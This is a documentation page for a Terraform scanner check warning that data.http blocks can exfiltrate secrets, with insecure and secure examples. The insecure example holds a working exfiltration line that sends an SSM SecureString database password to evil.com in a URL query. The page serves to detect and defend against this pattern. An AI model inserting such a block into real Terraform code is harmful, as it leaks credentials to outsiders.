---
title: Secrets should not be exfiltrated using Terraform HTTP data blocks
---

# Secrets should not be exfiltrated using Terraform HTTP data blocks

### Default Severity: <span class="severity critical">critical</span>

### Explanation

The data.http block can be used to send secret data outside of the organisation.

### Possible Impact
Secrets could be exposed outside of the organisation.

### Suggested Resolution
Remove this potential exfiltration HTTP request.


### Insecure Example

The following example will fail the aws-ssm-avoid-leaks-via-http check.
```terraform

resource "aws_ssm_parameter" "db_password" {
  name = "db_password"
  type = "SecureString"
  value = var.db_password
}

data "http" "not_exfiltrating_data_honest" {
  url = "https://evil.com/?p=${aws_ssm_parameter.db_password.value}"
}
 
```



### Secure Example

The following example will pass the aws-ssm-avoid-leaks-via-http check.
```terraform

resource "aws_ssm_parameter" "db_password" {
  name = "db_password"
  type = "SecureString"
  value = var.db_password
}

 
```



### Links


- [https://sprocketfox.io/xssfox/2022/02/09/terraformsupply/](https://sprocketfox.io/xssfox/2022/02/09/terraformsupply/){:target="_blank" rel="nofollow noreferrer noopener"}



